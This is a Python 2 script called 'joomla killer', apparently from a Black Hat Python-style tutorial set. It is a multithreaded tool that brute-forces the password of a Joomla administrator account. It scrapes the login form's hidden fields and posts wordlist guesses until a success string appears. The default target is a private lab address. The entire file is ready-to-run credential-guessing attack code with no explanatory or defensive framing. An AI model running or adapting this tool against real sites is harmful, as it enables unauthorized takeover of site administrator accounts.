#!/usr/bin/env python
'''joomla killer'''

# standard imports
import argparse
import os
import sys
import threading

# other imports
import cookielib
import Queue
import urllib
import urllib2

from HTMLParser import HTMLParser

def getargs():
    '''parse the command line arguments'''
    # process the command line
    parser = argparse.ArgumentParser(description='BHP Web Examples')

    parser.add_argument('url', nargs='?',
                        default='http://192.168.85.128:8080/joomla/administrator/index.php',
                        help='the target url')
    parser.add_argument('post', nargs='?',
                        default='http://192.168.85.128:8080/joomla/administrator/index.php',
                        help='the url to post to')
    parser.add_argument('username', nargs='?', default='admin', help='username to brute')
    parser.add_argument('-tc', '--thread_count', default=10, help='number of threads to use')
    parser.add_argument('-w', '--wordlist', default='cain.txt',
                        help='file containing the pw to try')
    parser.add_argument('-u', '--username_field', default='username',
                        help='name of the username form field')
    parser.add_argument('-p', '--password_field', default='passwd',
                        help='name of the password form field')
    parser.add_argument('-s', '--success_check', default='Control Panel - My Awesome Site! - Administration',
                        help='text to identify a successful login')
    parser.add_argument('--verbose', default=1, type=int, help='level of verboseness - how much gets printed out while running')

    result = parser.parse_args()

    if result.verbose > 1:
        print result

    return result

def build_threads(thread_count, target, args):
    '''spawn the threads'''
    threads = []
    for i in range(thread_count):
        print 'Spawning Thread: %d' % i
        threads.append(threading.Thread(target=target, args=args, name='thread_%d' % (i+1)))
    def starter():
        '''start all the threads'''
        for t in threads:
            t.start()
    return starter

resume = None
def build_wordqueue(wordlist_file):
    '''build a queue of words from wordlist_file'''
    # read the wordlist_file
    fd = open(wordlist_file, 'rb')
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue.Queue()

    for word in raw_words:
        word = word.rstrip()

        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print 'Resuming wordlist from: %s' % resume
        else:
            words.put(word)

    return words

class Bruter(object):
    '''bruter'''
    def __init__(self, args, words):
        self.args = args
        self.user_thread = args.thread_count
        self.username = args.username
        self.wordlist_file = args.wordlist
        self.target_url = args.url
        self.target_post = args.post
        self.username_field = args.username_field
        self.password_field = args.password_field
        self.success_check = args.success_check

        self.password_q = words
        self.found = False
        print 'Finished setting up for: %s' % self.username

    def run_bruteforce(self):
        '''build brute threads'''
        starter = build_threads(self.user_thread, self.web_bruter, args=[])
        starter()
    def web_bruter(self):
        '''brute some web'''
        if self.args.verbose > 1:
            print 'Starting %s' % threading.current_thread().name

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar('cookies')
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response = opener.open(self.target_url)
            page = response.read()
            if self.args.verbose > 0:
                print 'Trying: %s : %s (%d left)' % (
                    self.username,
                    brute,
                    self.password_q.qsize()
                )
            parser = BruteParser()
            parser.feed(page)
            post_tags = parser.tag_results
            post_tags[self.username_field] = self.username
            post_tags[self.password_field] = brute
            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(self.target_post, login_data)
            login_result = login_response.read()
            if self.success_check in login_result:
                self.found = True
                print '[*] Bruteforce successful'
                print '[*] Username: %s' % self.username
                print '[*] Password: %s' % brute
                print '[*] Waiting for other threads to exit...'

class BruteParser(HTMLParser):
    '''brute parser'''
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}
    def handle_starttag(self, tag, attrs):
        '''eat page'''
        if tag == 'input':
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == 'name':
                    tag_name = value
                if name == 'value':
                    tag_value = value

                if tag_name != None:
                    self.tag_results[tag_name] = tag_value



def main():
    '''main'''
    args = getargs()
    user_thread = args.thread_count
    username = args.username
    wordlist_file = args.wordlist
    target_url = args.url
    target_post = args.post
    username_field = args.username_field
    password_field = args.password_field
    success_check = args.success_check

    print (user_thread,
           username,
           wordlist_file,
           target_url,
           target_post,
           username_field,
           password_field,
           success_check)

    words = build_wordqueue(wordlist_file)
    bruter = Bruter(args, words)
    bruter.run_bruteforce()


main()
